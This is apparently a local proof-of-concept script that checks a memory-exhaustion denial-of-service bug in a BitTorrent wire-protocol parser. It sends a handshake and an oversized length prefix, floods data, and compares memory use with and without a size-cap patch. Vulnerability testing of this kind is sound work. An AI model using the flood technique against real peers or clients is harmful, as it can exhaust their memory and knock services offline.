// PoC v2 (scratchpad only). usage: node bp-poc2.mjs <modulePath> <prefixHex> <chunkBytes> <totalMiB> <patched:0|1> [capBytes]
import { pathToFileURL } from 'node:url'
const [modulePath, prefixHex, chunkArg, totalArg, patchedArg, capArg] = process.argv.slice(2)
const chunk = Number(chunkArg); const totalMiB = Number(totalArg); const patched = patchedArg === '1'
const cap = Number(capArg || 262144)
const { default: Wire } = await import(pathToFileURL(modulePath).href)
const wire = new Wire('webrtc', 0)
let closed = false; let errMsg = null
wire.on('error', (e) => { errMsg = e && e.message })
wire.on('close', () => { closed = true })
if (patched) {
  const orig = wire._onMessageLength.bind(wire)
  wire._onMessageLength = (buf) => {
    const len = new DataView(buf.buffer, buf.byteOffset, 4).getUint32(0)
    if (len > cap) { wire.destroy(new Error('oversized message ' + len)); return }
    orig(buf)
  }
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
async function feed (buf) {
  if (closed) return
  if (!wire.write(buf)) await Promise.race([new Promise((res) => wire.once('drain', res)), new Promise((res) => wire.once('close', res))])
}
const hs = new Uint8Array(68); hs[0] = 19; hs.set(new TextEncoder().encode('BitTorrent protocol'), 1); hs[25] = 0x10; hs.fill(7, 28, 48); hs.fill(9, 48)
await feed(hs); await sleep(10)
const prefix = new Uint8Array(4); new DataView(prefix.buffer).setUint32(0, parseInt(prefixHex, 16))
await feed(prefix); await sleep(10)
const stateAfterPrefix = { parserSize: wire._parserSize, parser: wire._parser && wire._parser.name }
const payload = new Uint8Array(chunk)
const n = Math.floor((totalMiB * 1048576) / chunk)
const t0 = performance.now(); let sent = 0
for (let i = 0; i < n && !closed; i++) { await feed(payload); sent += chunk }
await sleep(50)
const ms = performance.now() - t0; const m = process.memoryUsage()
console.log(JSON.stringify({ prefixHex, patched, chunkBytes: chunk, stateAfterPrefix, sentMiB: +(sent / 1048576).toFixed(1), closed, errMsg,
  elapsedMs: Math.round(ms), bufferedMiB: +(wire._bufferSize / 1048576).toFixed(1), parserSizeMiB: +(wire._parserSize / 1048576).toFixed(1),
  rssMiB: Math.round(m.rss / 1048576), arrayBuffersMiB: Math.round(m.arrayBuffers / 1048576) }))
process.exit(0)
